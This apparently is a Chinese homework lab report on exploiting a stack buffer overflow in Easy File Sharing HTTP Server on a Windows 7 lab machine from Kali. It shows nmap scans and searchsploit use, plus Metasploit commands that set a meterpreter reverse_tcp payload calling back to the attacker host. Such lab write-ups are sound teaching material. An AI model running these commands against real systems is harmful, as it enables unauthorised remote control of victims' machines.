---
title: "漏洞测试：Easy File Sharing HTTP Server"
category: 作业
description: "使用kali对windows7靶机上安装的简单文件共享HTTP服务器进行远程溢出漏洞渗透测试。"
published: 2026-11-07
tags: [作业，渗透测试]
---
**`安全声明：本报告及相关检测脚本仅用于经授权的安全测试、漏洞验证与教学研究。文中涉及的漏洞信息、复现步骤与利用方法,仅限在已获得明确书面授权的目标系统上使用。严禁将本报告内容及脚本用于任何未经授权的系统入侵、非法渗透或其他违反法律法规的行为。报告作者与提供方对任何滥用、误用本材料所造成的一切后果不承担任何责任。`**
**一、简介**
Easy File Sharing HTTP Server 是一款商业文件共享软件，主要功能是让用户通过网页浏览器（如 IE、Firefox、Chrome）轻松上传和下载文件。它适合用于与客户、合作伙伴或远程用户共享文件，无需对方安装特殊软件。

**二、实验环境**
靶机：安装有Easy File Sharing HTTP Server的Windows7
攻击机：kali

**三、实验过程**
**3-1 前置步骤**
**01 靶机ip地址及服务查询**
```
nmap 192.168.xxx.0/24
```
![](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/10/219cf7616e8405286d20d5ec67cec6fe-20261110194034217.png)
```
nmap -sV 192.168.xxx.133
```
![](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/10/b36d7b07aa7ccc71bf932fb9ea9691c7-20261110194713024.png)
**02 漏洞库exploit-db安装**
```
sudo apt update
sudo apt install exploitdb
```
**03 Easy File Sharing HTTP Server配置**
设置端口为8000。
![](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/10/665974a560657ef0ab5326561addbf53-20261110202240391.png)

**3-2 searchsploit+python脚本测试**
    
    searchsploit主要用途与常用操作：
    1.离线搜索漏洞：这是最基础的功能。你无需联网，直接输入关键词（如软件名、版本）即可查询。例如 searchsploit apache 2.4。
    2.按 CVE 编号搜索：如果你已知某个漏洞的 CVE 编号，可以直接用 --cve 选项精准查找。例如 searchsploit --cve 2021-44228。
    3.查看与复制利用代码：找到目标后，你可以用 -x 直接查看代码内容，或用 -m 将利用脚本复制到当前目录，方便后续修改和测试。
    4.结合 Nmap 扫描结果：通过 --nmap 选项，可以让 searchsploit 读取 Nmap 的 XML 扫描报告，自动匹配扫描到的服务版本是否存在已知漏洞。
    5.保持数据库更新：由于新的漏洞利用会不断加入，建议定期运行 searchsploit -u 来更新本地的漏洞库。

查询漏洞并执行脚本攻击：
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/10/270c87c021204b3992ea8cde325b4d35-yank-note-picgo-img-20261110204158.png)

![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/10/db46ab6c2909b03f422ec1f55a53bf64-yank-note-picgo-img-20261110204047.png)

**3-3 Metasploit攻击**
启动Metasploit,查找和EasyFileSharing有关模块：
```
search EasyFileSharing
```
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/10/b98e9be379c314e989ade2956b89794f-yank-note-picgo-img-20261110204748.png)
使用exploit/windows/http/easyfilesharing_seh模块并查看参数：
```
msf > use exploit/windows/http/easyfilesharing_seh
msf exploit(windows/http/easyfilesharing_seh) > show options

```

![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/10/6d53db3ef88e37b60d355da444857da2-yank-note-picgo-img-20261110204927.png)
使用reverse_tcp攻击载荷配合该模块控制靶机：
```
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.xxx.xxx(kali)
set rhost 192.168.xxx.133(windows7)
set rport 8000
exploit
```
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/10/4e94eb678796b922781e30dde043e601-yank-note-picgo-img-20261110210220.png)

**四、总结**
本次测试利用了Easy File Sharing HTTP Server存在的栈溢出漏洞，‘通过向目标服务器发送一个超长的、特制的 HTTP HEAD 请求，触发缓冲区溢出漏洞，并利用 Windows 的结构化异常处理（SEH）机制来劫持程序执行流，最终实现远程代码执行(HEAD Request Buffer Overflow (SEH))’，控制目标主机。